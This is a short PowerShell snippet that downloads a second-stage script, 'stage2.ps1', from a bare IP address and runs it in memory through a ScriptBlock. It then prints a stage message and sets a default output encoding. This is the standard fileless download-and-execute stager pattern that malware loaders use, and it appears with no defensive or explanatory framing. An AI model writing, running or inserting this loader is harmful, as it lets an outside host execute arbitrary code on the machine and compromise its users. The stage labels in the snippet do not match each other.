$TransferUrl = "http://198.51.100.64/stage2.ps1"
$StageScript = (New-Object Net.WebClient).DownloadString($TransferUrl)
& ([ScriptBlock]::Create($StageScript))
Write-Output "stage 6 initialized"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
